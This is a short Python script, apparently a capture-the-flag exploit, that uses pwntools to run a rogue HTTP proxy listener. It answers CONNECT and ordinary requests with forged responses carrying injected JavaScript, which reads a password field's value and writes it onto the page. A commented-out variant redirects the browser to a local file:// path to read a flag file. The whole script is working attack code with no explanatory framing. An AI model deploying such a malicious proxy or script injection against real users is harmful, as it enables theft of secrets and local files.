# from flask import Flask, request
from pwn import *

context.log_level = 'debug'

header_template = lambda sz: f'''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: {sz}
Server: TornadoServer/6.2
'''.encode()

inject_js = '''
window.onload = () => {
setTimeout(()=>{
    let secret = document.getElementById("primogem_code").value;
    document.getElementById("leak").innerText = secret;
}, 2000);
}
'''
# inject_js_jump = '''
# window.onload = () => {
# setTimeout(()=>{
#     location.href="file:///app/profiles/flag.yml"
# }, 2000);
# }
# '''

body_template = lambda :f'''<h1 id="leak"></h1>test <input type="password" code="wanyuanshenwande" value="placeholder" id="primogem_code"></input>
<script>{inject_js}</script>
'''.encode()

connect_response_header = lambda : f'''HTTP/1.1 200 Connection Established
'''.encode()

conn = None
while True:
    if conn is None or conn.closed:
        conn = listen(19268 ,bindaddr='0.0.0.0')
    req = conn.recv()
    print(req)

    lines = req.split(b'\n')
    if b'CONNECT' in lines[0]:
        conn.sendline(connect_response_header())
        body = body_template()
        header = header_template(sz = len(body))
        conn.send(header + b'\n' + body)
        conn.close()

    else:
        body = body_template()
        header = header_template(sz = len(body))
        conn.send(header + b'\n' + body)

        conn.close()
